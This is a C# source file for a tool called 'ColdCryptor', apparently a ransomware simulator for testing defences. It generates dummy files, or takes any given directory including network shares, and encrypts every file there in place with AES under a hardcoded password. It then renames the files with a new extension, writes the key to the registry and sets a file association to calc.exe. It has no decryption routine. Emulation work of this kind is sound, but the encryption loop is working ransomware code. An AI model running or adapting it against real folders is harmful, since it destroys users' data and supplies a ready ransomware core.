using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Microsoft.Win32;

public class Crypto
{
    // store all of the generated crypto related code used for the EncryptFile function here
    public Crypto()
    {
        string password = "password";
        byte[] salt = new byte[32];
        RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
        for (int i = 0; i < 10; i++)
        {
            // Fill buffer.
            rng.GetBytes(salt);
        }
        byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
        RijndaelManaged AES = new RijndaelManaged();
        AES.KeySize = 256;
        AES.BlockSize = 128;
        AES.Padding = PaddingMode.PKCS7;
        Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
        AES.Key = key.GetBytes(AES.KeySize / 8);
        AES.IV = key.GetBytes(AES.BlockSize / 8);
        AES.Mode = CipherMode.CBC;
        this.AES = AES;
        this.salt = salt;
    }

    public RijndaelManaged AES { get; private set; }
    public byte[] salt { get; private set; }
}

public static class ColdCryptor
{
    [DllImport("shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);

    [DllImport("shlwapi.dll", CharSet = CharSet.Unicode)]
    public static extern bool PathIsUNC([MarshalAsAttribute(UnmanagedType.LPWStr), In] string pszPath);

    // https://stackoverflow.com/a/1262619
    public static void Shuffle<T>(this IList<T> list)
    {
        Random rng = new Random();
        int n = list.Count;
        while (n > 1)
        {
            n--;
            int k = rng.Next(n + 1);
            T value = list[k];
            list[k] = list[n];
            list[n] = value;
        }
    }

    static void Main(string[] args)
    {
        Console.WriteLine("ColdCryptor");

        List<string> directories;
        bool createFiles = true;
        bool unc = PathIsUNC(Directory.GetCurrentDirectory());

        if (args.Length < 2)
        {
            Console.WriteLine("missing args");
            return;

        }
        else
        {
            // coldcryptor <command> <extension> [<directory>]
            if (args.Length == 3)
            {
                directories = new List<string> { args[2] };
                createFiles = false;
                if (PathIsUNC(Path.GetFullPath(args[2])))
                {
                    unc = true;
                }
            }
            else
            {
                directories = new List<string> { "one", "two", "three" };  // directories to make
            }
        }

        Crypto crypto = new Crypto();
        string cc_key_name = "ColdCryptor";  // registry key name for where to store password
        string assoc = "ColdCryptor";  // registry association key name
        string extension = args[1];
        string extension_key_name = "." + extension;

        if (String.Compare(args[0], "run") == 0)
        {
            Console.WriteLine("run");
            var files = new List<string>();

            if (createFiles)
            {
                bool writeData = false;
                string fileData = "";
                // if the file "data" exists, use it to populate generated files
                if (File.Exists("data"))
                {
                    writeData = true;
                    fileData = File.ReadAllText("data");
                }
                foreach (string directory in directories)
                {
                    Directory.CreateDirectory(directory);
                    foreach (int num in Enumerable.Range(1, 50))
                    {
                        string file = directory + "/" + num + ".txt";
                        using (StreamWriter sw = File.CreateText(file))
                        {
                            // file name (no extension) + directory written to generated files always
                            // data file written is file is detected
                            sw.WriteLine(directory);
                            sw.WriteLine(num);
                            if (writeData)
                            {
                                sw.WriteLine(fileData);
                            }
                        }
                        files.Add(file);
                    }
                }
            }
            else
            {
                // Directory.EnumerateFiles in .NET Framework does not MoveNext() properly on exceptions
                AddAllFiles(directories[0], files);
            }

            int ct_enc = 0;
            int ct_skip = 0;
            files.Shuffle();
            Parallel.ForEach(files, file => {
                try{
                    EncryptFile(file, extension, crypto);
                    Console.WriteLine("ENC " + file);
                    ct_enc++;
                } catch{
                    Console.WriteLine("ERR " + file);
                    ct_skip++;
                }    
            });
            Console.WriteLine("");
            Console.WriteLine("Encrypted: " + ct_enc);
            Console.WriteLine("Errors: " + ct_skip);

            // if the current direcory is a UNC path or the supplied directory is a UNC path, don't set the registry keys 
            //     as they only apply to the local host and not the host where the UNC path is located
            if (!unc) 
            { 
                // store key in reg
                RegistryKey software_key = Registry.CurrentUser.OpenSubKey("SOFTWARE", true);
                software_key.CreateSubKey(cc_key_name);
                RegistryKey cc_key = software_key.OpenSubKey(cc_key_name, true);
                cc_key.SetValue("RWKey", "password");

                // file assoc
                // HKCU\SOFTWARE
                // \_ Classes
                //    \_ .extension -> ColdCryptor
                // \_ ColdCryptor
                //    \_ shell\open\command
                // https://stackoverflow.com/a/28585998
                software_key.CreateSubKey("Classes");
                RegistryKey classes_key = software_key.OpenSubKey("Classes", true);
                classes_key.CreateSubKey(extension_key_name);
                RegistryKey ext_key = classes_key.OpenSubKey(extension_key_name, true);
                ext_key.SetValue("", assoc);
                classes_key.CreateSubKey(assoc);
                RegistryKey assoc_key = classes_key.OpenSubKey(assoc, true);
                assoc_key.CreateSubKey("shell");
                RegistryKey shell_key = assoc_key.OpenSubKey("shell", true);
                shell_key.CreateSubKey("open");
                RegistryKey open_key = shell_key.OpenSubKey("open", true);
                open_key.CreateSubKey("command");
                RegistryKey command_key = open_key.OpenSubKey("command", true);
                command_key.SetValue("", @"C:\Windows\System32\calc.exe");
                // https://stackoverflow.com/a/2697804
                SHChangeNotify(0x08000000, 0x0000, IntPtr.Zero, IntPtr.Zero);
            }
        }

        if (String.Compare(args[0], "clean") == 0)
        {
            Console.WriteLine("clean");
            foreach (string directory in directories)
            {
                Directory.Delete(directory, true);
            }

            if (!unc)
            {
                RegistryKey software_key = Registry.CurrentUser.OpenSubKey("SOFTWARE", true);
                software_key.DeleteSubKeyTree(cc_key_name, false);
                RegistryKey classes_key = software_key.OpenSubKey("Classes", true);
                classes_key.DeleteSubKeyTree(extension_key_name, false);
                classes_key.DeleteSubKeyTree(assoc, false);
                SHChangeNotify(0x08000000, 0x0000, IntPtr.Zero, IntPtr.Zero);

            }
        }

        Console.WriteLine("");
        Console.WriteLine("Done");
        return;
    }

    public static void EncryptFile(string inputFile, string ext, Crypto crypto)
    {
        var AES = crypto.AES;
        var salt = crypto.salt;
 
        MemoryStream memTmp = new MemoryStream();
        using(FileStream fsIn = new FileStream(inputFile, FileMode.Open))
        {
            fsIn.CopyTo(memTmp);
        }

        memTmp.Seek(0, SeekOrigin.Begin);
        FileStream fsOut = new FileStream(inputFile, FileMode.Truncate);
        using (CryptoStream cs = new CryptoStream(memTmp, AES.CreateEncryptor(), CryptoStreamMode.Read))
        {
            cs.CopyTo(fsOut);
        }
        fsOut.Close();
        memTmp.Close();
        File.Move(inputFile, inputFile + "." + ext);
    }

    public static List<string> AddAllFiles(string dir, List<string> files)
    {
        foreach (string file in Directory.GetFiles(dir)) {
            files.Add(file);
        }
        foreach (string subDir in Directory.GetDirectories(dir)) {
            try {
                AddAllFiles(subDir, files);
            } catch {
                //nothing
            }
        }
        return files;
    }
}
